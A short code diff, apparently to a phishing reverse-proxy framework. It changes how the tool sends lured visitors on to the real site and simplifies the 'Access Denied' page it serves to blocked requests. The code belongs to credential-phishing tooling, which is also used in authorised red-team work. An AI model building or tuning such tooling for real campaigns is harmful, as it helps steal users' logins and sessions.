@@ -621,9 +621,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if l.RedirectUrl != "" {
 										session.RedirectURL = l.RedirectUrl
 									}
-									if session.RedirectURL != "" {
-										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
-									}
+									// redirect_url should point to the real site, not the phished domain
+									// do not rewrite it through replaceUrlWithPhished
 									session.PhishLure = l
 									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
@@ -1807,10 +1806,8 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 
 	if redirect_url != "" {
 		return p.javascriptRedirect(req, redirect_url)
-	} else {
-		return p.renderErrorPage(req, http.StatusForbidden, "Access Denied", "Your request could not be processed. This resource requires proper authorization.")
 	}
-	return req, nil
+	return p.renderErrorPage(req, http.StatusForbidden, "Access Denied", "Your request could not be processed. This resource requires proper authorization.")
 }
 
 func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
